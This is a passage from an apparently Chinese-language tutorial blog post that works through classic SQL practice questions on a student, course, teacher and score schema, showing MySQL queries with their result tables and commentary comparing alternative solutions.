class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">| 1990-12-21 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">| 1990-08-06 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">05</span>   <span class="params">| 周梅   |</span> <span class="number">1991</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">| 1992-03-01 00:00:00 |</span> 女   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">07</span>   <span class="params">| 郑竹   |</span> <span class="number">1989</span>-<span class="number">07</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">7</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>4. 查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩(没成绩的显示为 null )</strong></p><p>这道题得用到left join或者right join，不能用where连接，因为题目说了要求有显示为null的，where是inner join，不会出现null，在这道题里会查不出第08号学生。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.sid, s.sname, <span class="keyword">count</span>(cid) <span class="keyword">as</span> 选课总数, <span class="keyword">sum</span>(score) <span class="keyword">as</span> 总成绩</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">as</span> s <span class="keyword">left</span> <span class="keyword">join</span> sc</span><br><span class="line"><span class="keyword">on</span> s.sid = sc.sid</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> s.sid</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+--------------+-----------+</span><br><span class="line"><span class="params">| sid  |</span> sname  <span class="params">| 选课总数     |</span> 总成绩    <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+--------------+-----------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span>            <span class="number">3</span> <span class="params">|     269.0 |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">|            3 |</span>     <span class="number">210.0</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span>            <span class="number">3</span> <span class="params">|     240.0 |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">|            3 |</span>     <span class="number">100.0</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">05</span>   <span class="params">| 周梅   |</span>            <span class="number">2</span> <span class="params">|     163.0 |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">|            2 |</span>      <span class="number">65.0</span> <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">07</span>   <span class="params">| 郑竹   |</span>            <span class="number">2</span> <span class="params">|     187.0 |</span></span><br><span class="line"><span class="params">| 08   |</span> 王菊   <span class="params">|            0 |</span>      NULL <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+--------------+-----------+</span></span><br><span class="line"><span class="params">8 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p><strong>4.1 查有成绩的学生信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.sid, s.sname, <span class="keyword">count</span>(*) <span class="keyword">as</span> 选课总数, <span class="keyword">sum</span>(score) <span class="keyword">as</span> 总成绩,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid = <span class="number">01</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="literal">null</span> <span class="keyword">end</span>) <span class="keyword">as</span> score_01,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid = <span class="number">02</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="literal">null</span> <span class="keyword">end</span>) <span class="keyword">as</span> score_02,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid = <span class="number">03</span> <span class="keyword">then</span> score <span class="keyword">else</span> <span class="literal">null</span> <span class="keyword">end</span>) <span class="keyword">as</span> score_03</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">as</span> s, sc</span><br><span class="line"><span class="keyword">where</span> s.sid = sc.sid</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> s.sid</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+--------------+-----------+----------+----------+----------+</span><br><span class="line"><span class="params">| sid  |</span> sname  <span class="params">| 选课总数     |</span> 总成绩    <span class="params">| score_01 |</span> score_02 <span class="params">| score_03 |</span></span><br><span class="line">+------+--------+--------------+-----------+----------+----------+----------+</span><br><span class="line"><span class="params">| 01   |</span> 赵雷   <span class="params">|            3 |</span>     <span class="number">269.0</span> <span class="params">|     80.0 |</span>     <span class="number">90.0</span> <span class="params">|     99.0 |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">|            3 |</span>     <span class="number">210.0</span> <span class="params">|     70.0 |</span>     <span class="number">60.0</span> <span class="params">|     80.0 |</span></span><br><span class="line"><span class="params">| 03   |</span> 孙风   <span class="params">|            3 |</span>     <span class="number">240.0</span> <span class="params">|     80.0 |</span>     <span class="number">80.0</span> <span class="params">|     80.0 |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">|            3 |</span>     <span class="number">100.0</span> <span class="params">|     50.0 |</span>     <span class="number">30.0</span> <span class="params">|     20.0 |</span></span><br><span class="line"><span class="params">| 05   |</span> 周梅   <span class="params">|            2 |</span>     <span class="number">163.0</span> <span class="params">|     76.0 |</span>     <span class="number">87.0</span> <span class="params">|     NULL |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">|            2 |</span>      <span class="number">65.0</span> <span class="params">|     31.0 |</span>     NULL <span class="params">|     34.0 |</span></span><br><span class="line"><span class="params">| 07   |</span> 郑竹   <span class="params">|            2 |</span>     <span class="number">187.0</span> <span class="params">|     NULL |</span>     <span class="number">89.0</span> <span class="params">|     98.0 |</span></span><br><span class="line">+------+--------+--------------+-----------+----------+----------+----------+</span><br><span class="line"><span class="number">7</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>5. 查询「李」姓老师的数量</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(tname) <span class="keyword">from</span> teacher <span class="keyword">where</span> tname <span class="keyword">like</span> <span class="string">&#x27;李%&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line"><span class="params">| count(tname) |</span></span><br><span class="line">+--------------+</span><br><span class="line"><span class="params">|            1 |</span></span><br><span class="line">+--------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>6. 查询学过「张三」老师授课的同学的信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">sid</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">sid</span> <span class="keyword">from</span> sc, course, teacher</span><br><span class="line">    <span class="keyword">where</span> sc.cid = course.cid</span><br><span class="line">     <span class="keyword">and</span> course.tid = teacher.tid</span><br><span class="line">     <span class="keyword">and</span> tname = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">| 1990-12-21 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">| 1990-08-06 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">05</span>   <span class="params">| 周梅   |</span> <span class="number">1991</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line"><span class="params">| 07   |</span> 郑竹   <span class="params">| 1989-07-01 00:00:00 |</span> 女   <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">6 rows <span class="keyword">in</span> set (0.00 sec)</span></span><br></pre></td></tr></table></figure><p>原作者的写法里面用到了等号 =，虽然得到同样的结果，但是这样写不太好，因为不确定张三老师是不是只教授一门课（只不过现在的数据量太小了而已），in 适用于一个或多个返回结果的情况，适应性比等号更广。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">sid</span> <span class="keyword">in</span>(<span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">Sid</span> <span class="keyword">from</span> SC</span><br><span class="line"><span class="keyword">where</span> cid=(<span class="keyword">select</span> Cid <span class="keyword">from</span> Course</span><br><span class="line"><span class="keyword">where</span> Tid=(<span class="keyword">select</span> Tid <span class="keyword">from</span> Teacher <span class="keyword">where</span> Tname=<span class="string">&#x27;张三&#x27;</span>)))</span><br></pre></td></tr></table></figure><p><strong>7. 查询没有学全所有课程的同学的信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">sid</span> <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">sid</span> <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">sid</span> <span class="keyword">having</span> <span class="keyword">count</span>(cid) &lt; <span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">05</span>   <span class="params">| 周梅   |</span> <span class="number">1991</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">| 1992-03-01 00:00:00 |</span> 女   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">07</span>   <span class="params">| 郑竹   |</span> <span class="number">1989</span>-<span class="number">07</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>9. 查询和” 01 “号的同学学习的课程完全相同的其他同学的信息</strong><br> 这道题号称是所有题目里最难的一道，我虽然做了出来，但是写法很麻烦，不必要。原作者写的很简洁：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Student</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">Sid</span> <span class="keyword">in</span>(</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">Sid</span> <span class="keyword">from</span> SC</span><br><span class="line">    <span class="keyword">where</span> Cid <span class="keyword">in</span> (<span class="keyword">select</span> Cid <span class="keyword">from</span> SC <span class="keyword">where</span> <span class="keyword">Sid</span> = <span class="string">&#x27;01&#x27;</span>) <span class="keyword">and</span> <span class="keyword">Sid</span> &lt;&gt;<span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">Sid</span></span><br><span class="line">    <span class="keyword">having</span> <span class="keyword">COUNT</span>(Cid)&gt;=<span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">02</span>   <span class="params">| 钱电   |</span> <span class="number">1990</span>-<span class="number">12</span>-<span class="number">21</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 03   |</span> 孙风   <span class="params">| 1990-05-20 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">04</span>   <span class="params">| 李云   |</span> <span class="number">1990</span>-08-<span class="number">06</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p>我写的就太麻烦啦。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">sid</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> B.sid</span><br><span class="line">    <span class="keyword">from</span></span><br><span class="line">        (<span class="keyword">select</span> <span class="keyword">sid</span>,</span><br><span class="line">            <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">01</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> course_01,</span><br><span class="line">            <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">02</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> course_02,</span><br><span class="line">            <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">03</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> course_03</span><br><span class="line">        <span class="keyword">from</span> sc <span class="keyword">where</span> <span class="keyword">sid</span> = <span class="number">01</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">sid</span>) <span class="keyword">as</span> A,</span><br><span class="line">        (<span class="keyword">select</span> <span class="keyword">sid</span>,</span><br><span class="line">            <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">01</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> course_01,</span><br><span class="line">            <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">02</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> course_02,</span><br><span class="line">            <span class="keyword">sum</span>(<span class="keyword">case</span> <span class="keyword">when</span> cid=<span class="number">03</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>) <span class="keyword">as</span> course_03</span><br><span class="line">        <span class="keyword">from</span> sc <span class="keyword">where</span> <span class="keyword">sid</span> != <span class="number">01</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">sid</span>) <span class="keyword">as</span> B</span><br><span class="line">    <span class="keyword">where</span> A.course_01=B.course_01 <span class="keyword">and</span> A.course_02=B.course_02 <span class="keyword">and</span> A.course_03=B.course_03</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">02</span>   <span class="params">| 钱电   |</span> <span class="number">1990</span>-<span class="number">12</span>-<span class="number">21</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 03   |</span> 孙风   <span class="params">| 1990-05-20 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">04</span>   <span class="params">| 李云   |</span> <span class="number">1990</span>-08-<span class="number">06</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>8. 查询至少有一门课与学号为” 01 “的同学所学相同的同学的信息</strong></p><p>和第9题基本一致，还是原作者写的好一些</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Student <span class="keyword">where</span> <span class="keyword">Sid</span> <span class="keyword">in</span>(</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">Sid</span> <span class="keyword">from</span> SC <span class="keyword">where</span> Cid <span class="keyword">in</span>(</span><br><span class="line">        <span class="keyword">select</span> Cid <span class="keyword">from</span> SC <span class="keyword">where</span> <span class="keyword">Sid</span>=<span class="string">&#x27;01&#x27;</span></span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="params">| Sid  |</span> Sname  <span class="params">| Sage                |</span> Ssex <span class="params">|</span></span><br><span class="line"><span class="params">+------+--------+---------------------+------+</span></span><br><span class="line"><span class="params">|</span> <span class="number">01</span>   <span class="params">| 赵雷   |</span> <span class="number">1990</span>-<span class="number">01</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 02   |</span> 钱电   <span class="params">| 1990-12-21 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">03</span>   <span class="params">| 孙风   |</span> <span class="number">1990</span>-<span class="number">05</span>-<span class="number">20</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 男   |</span></span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">| 1990-08-06 00:00:00 |</span> 男   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">05</span>   <span class="params">| 周梅   |</span> <span class="number">1991</span>-<span class="number">12</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">| 1992-03-01 00:00:00 |</span> 女   <span class="params">|</span></span><br><span class="line"><span class="params">|</span> <span class="number">07</span>   <span class="params">| 郑竹   |</span> <span class="number">1989</span>-<span class="number">07</span>-<span class="number">01</span> <span class="number">00</span><span class="symbol">:</span><span class="number">00</span><span class="symbol">:</span><span class="number">00</span> <span class="params">| 女   |</span></span><br><span class="line">+------+--------+---------------------+------+</span><br><span class="line"><span class="number">7</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>10. 查询没学过”张三”老师讲授的任一门课程的学生姓名</strong></p><p>一般涉及到”任意”的都会用到not in这样的取反的结构：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname <span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> sname <span class="keyword">not</span> <span class="keyword">in</span> (</span><br><span class="line">    <span class="keyword">select</span> s.sname</span><br><span class="line">    <span class="keyword">from</span> student <span class="keyword">as</span> s, course <span class="keyword">as</span> c, teacher <span class="keyword">as</span> t, sc</span><br><span class="line">    <span class="keyword">where</span> s.sid = sc.sid</span><br><span class="line">        <span class="keyword">and</span> sc.cid = c.cid</span><br><span class="line">        <span class="keyword">and</span> c.tid = t.tid</span><br><span class="line">        <span class="keyword">and</span> t.tname = <span class="string">&#x27;张三&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------+</span><br><span class="line"><span class="params">| sname  |</span></span><br><span class="line">+--------+</span><br><span class="line"><span class="params">| 吴兰   |</span></span><br><span class="line"><span class="params">| 王菊   |</span></span><br><span class="line">+--------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>11. 查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> student.Sid,student.Sname,<span class="keyword">AVG</span>(sc.score) <span class="keyword">FROM</span> student,sc <span class="keyword">WHERE</span> student.Sid = sc.Sid <span class="keyword">AND</span></span><br><span class="line">student.Sid <span class="keyword">in</span></span><br><span class="line"><span class="comment">-- 获取 满足两门及其以上不及格的同学的学号，姓名</span></span><br><span class="line">(<span class="keyword">SELECT</span> P1Stu.Sid</span><br><span class="line"><span class="keyword">FROM</span> student P1Stu,sc P1sc</span><br><span class="line"><span class="keyword">WHERE</span> P1Stu.Sid = P1sc.Sid <span class="keyword">AND</span> P1sc.score &lt;=<span class="number">60</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">Sid</span> <span class="keyword">HAVING</span> <span class="keyword">count</span>(score) &gt;= <span class="number">2</span>)</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> sc.Sid;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+------------+</span><br><span class="line"><span class="params">| sid  |</span> sname  <span class="params">| avg(score) |</span></span><br><span class="line">+------+--------+------------+</span><br><span class="line"><span class="params">| 04   |</span> 李云   <span class="params">|   33.33333 |</span></span><br><span class="line"><span class="params">| 06   |</span> 吴兰   <span class="params">|   32.50000 |</span></span><br><span class="line">+------+--------+------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0</span>.<span class="number">00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>12. 检索” 01 “课程分数小于 60，按分数降序排列的学生信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> s.* ,score</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">as</span> s, sc</span><br><span class="line"><span class="keyword">where</span> 